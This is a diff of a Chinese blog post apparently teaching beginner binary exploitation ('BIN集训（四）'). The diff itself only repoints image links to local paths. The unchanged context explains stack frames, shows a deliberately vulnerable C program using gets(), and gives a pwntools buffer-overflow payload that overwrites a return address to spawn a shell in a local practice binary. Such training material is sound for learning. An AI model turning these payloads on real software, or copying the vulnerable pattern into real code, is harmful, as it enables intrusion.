@@ -19,21 +19,21 @@
 <meta property="og:site_name" content="AssassinQ">
 <meta property="og:description" content="初涉PWN。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://images0.cnitblog.com/cnitblog_com/houcy/%E6%A0%88%E5%B8%A7%E5%9B%BE.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chrmmgua10au1cbmgd31b7u1b1sa.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqgv06716qj1h1m1v7c1730dnaa.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqfqt08124n11961f8t1saf3kja.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqglrfi1faghql1oi3qu6tpca.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqgs5co3teglh1rmo14go9qsa.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqh5hm3ag01hmh1pnj13nllqna.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqi2mer199noqu14qh6h91am1a.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqiihjr1rcq17u1ba31laa9ra.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1chqlhoto1nfehjs1f77upqkdla.png-j.jpg">
-<meta property="og:updated_time" content="2018-07-12T08:33:11.446Z">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/1.jpg">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/2.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/3.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/4.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/5.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/6.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/7.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/8.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/9.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/四/10.png">
+<meta property="og:updated_time" content="2018-10-06T08:55:52.398Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BIN集训（四）">
 <meta name="twitter:description" content="初涉PWN。">
-<meta name="twitter:image" content="http://images0.cnitblog.com/cnitblog_com/houcy/%E6%A0%88%E5%B8%A7%E5%9B%BE.jpg">
+<meta name="twitter:image" content="http://assassinq.com/pics/BIN集训/四/1.jpg">
   
     <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
   
@@ -218,14 +218,14 @@
 </ul>
 <p>如何保证栈帧平衡：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值</span><br><span class="line">MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧</span><br><span class="line"></span><br><span class="line">XXXXXX // 函数中间部分</span><br><span class="line"></span><br><span class="line">MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间</span><br><span class="line">POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧</span><br></pre></td></tr></table></figure>
-<p><img src="http://images0.cnitblog.com/cnitblog_com/houcy/%E6%A0%88%E5%B8%A7%E5%9B%BE.jpg" alt="调用函数后，会先保留旧的栈帧并建立新的栈帧（这里栈底在上，栈顶在下）"></p>
+<p><img src="/pics/BIN集训/四/1.jpg" alt="调用函数后，会先保留旧的栈帧并建立新的栈帧（这里栈底在上，栈顶在下）"></p>
 <p>函数返回的步骤：</p>
 <ol>
 <li>保存返回值，通常将函数的返回值保存在寄存器EAX中。 </li>
 <li>弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给EIP寄存器。</3></2></1></li>
 <li>跳转：按照函数返回地址跳回母函数中继续执行。</li>
 </ol>
-<p><img src="http://t1.aixinxi.net/o_1chrmmgua10au1cbmgd31b7u1b1sa.png-j.jpg" alt="每次调用一个函数都会新增一个栈帧（这里栈底在下，栈顶在上）"></p>
+<p><img src="/pics/BIN集训/四/2.png" alt="每次调用一个函数都会新增一个栈帧（这里栈底在下，栈顶在上）"></p>
 <p>PS：栈的守护天使——GS，也称作Stack Canary/Cookie</p>
 <h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL可以化为两部分，即<code>Push retaddr + Jump</code>。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p>
 <h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET也可以转化为两部分，即<code>Pop retaddr + Jump</code>。先是把返回值的地址出栈，再跳转回原本调用函数处。</p>
@@ -398,13 +398,13 @@
 <p>输入<code>gcc p1.c -o p1 -m32</code>，用来编译32位的程序。</p>
 <h3 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h3><p>根据源文件可以判断该程序调用<code>A()</code>函数时，在scanf中没有对字符串的长度做限制，即存在缓冲区溢出。</p>
 <p>根据源码，本题的思路应该为通过缓冲区溢出，将RET处的地址修改为<code>cmd()</code>函数的地址，直接跳转到该函数后getshell。故先通过<code>objdump</code>命令寻找到cmd函数的地址</p>
-<p><img src="http://t1.aixinxi.net/o_1chqgv06716qj1h1m1v7c1730dnaa.png-j.jpg" alt="找到cmd函数的地址"></p>
+<p><img src="/pics/BIN集训/四/3.png" alt="找到cmd函数的地址"></p>
 <p>然后输入<code>gdb p1</code>进入gdb调试界面。<code>start</code>开始调试程序。</p>
-<p><img src="http://t1.aixinxi.net/o_1chqfqt08124n11961f8t1saf3kja.png-j.jpg" alt="自上而下分别为寄存器、代码段、栈段"></p>
-<p><img src="http://t1.aixinxi.net/o_1chqglrfi1faghql1oi3qu6tpca.png-j.jpg" alt="单步进入A()"></p>
-<p><img src="http://t1.aixinxi.net/o_1chqgs5co3teglh1rmo14go9qsa.png-j.jpg" alt="单步执行到scanf后，用pattc命令构造出一段较长的字符"></p>
-<p><img src="http://t1.aixinxi.net/o_1chqh5hm3ag01hmh1pnj13nllqna.png-j.jpg" alt="继续单步执行，程序报错返回RET处的地址"></p>
-<p><img src="http://t1.aixinxi.net/o_1chqi2mer199noqu14qh6h91am1a.png-j.jpg" alt="使用patto命令查找得到偏移量"></p>
+<p><img src="/pics/BIN集训/四/4.png" alt="自上而下分别为寄存器、代码段、栈段"></p>
+<p><img src="/pics/BIN集训/四/5.png" alt="单步进入A()"></p>
+<p><img src="/pics/BIN集训/四/6.png" alt="单步执行到scanf后，用pattc命令构造出一段较长的字符"></p>
+<p><img src="/pics/BIN集训/四/7.png" alt="继续单步执行，程序报错返回RET处的地址"></p>
+<p><img src="/pics/BIN集训/四/8.png" alt="使用patto命令查找得到偏移量"></p>
 <p>已知偏移量为112后，容易知道可以直接通过溢出在RET处覆盖原本的地址，直接跳至<code>cmd()</code>函数处。</p>
 <p>payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">112</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -416,10 +416,10 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    srand(time(<span class="number">0</span>) ^ getpid());</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> magic = rand();</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">if</span> (atoi(buf) == magic) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Okay..."</span>);</span><br><span class="line">        system(<span class="string">"sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>同样输入<code>gcc 3-13.c -o 3-13 -m32</code>来编译。</p>
 <p>调试一开始发现权限不够，通过<code>chmod +x 3-13</code>来获得可执行权限。</p>
-<p><img src="http://t1.aixinxi.net/o_1chqiihjr1rcq17u1ba31laa9ra.png-j.jpg" alt="修改权限"></p>
+<p><img src="/pics/BIN集训/四/9.png" alt="修改权限"></p>
 <p>源代码中使用了<code>gets()</code>函数，存在缓存区溢出，故第一个想法应该就是通过对变量<code>buf</code>操作使其覆盖变量<code>magic</code>的值，使两者相同后得到shell。</p>
 <p><code>buf</code>被定义为一个占100字节的字符串，而<code>magic</code>被定义为一个占4字节的整型。</p>
-<p><img src="http://t1.aixinxi.net/o_1chqlhoto1nfehjs1f77upqkdla.png-j.jpg" alt="左侧文本记录了在调试过程中记录下的两个变量的地址"></p>
+<p><img src="/pics/BIN集训/四/10.png" alt="左侧文本记录了在调试过程中记录下的两个变量的地址"></p>
 <p>根据调试过程可以知道，<code>buf</code>的地址为0xffffcf68，而<code>magic</code>的地址为0xffffcfcc。<code>buf</code>的地址比<code>magic</code>的地址更低，两者在栈中显然是先压入<code>magic</code>再压入<code>buf</code>。又因为输入数据是从低位向高位输入，那么我们可以通过变化<code>buf</code>的值来覆盖<code>magic</code>的值。最简单的方法显然是让两者都等于零。</p>
 <p>根据以上的推测，那么输入字符串的长度应当至少为100+4=104字节才可能完全覆盖变量<code>magic</code>。</p>
 <p>故payload为：</p>
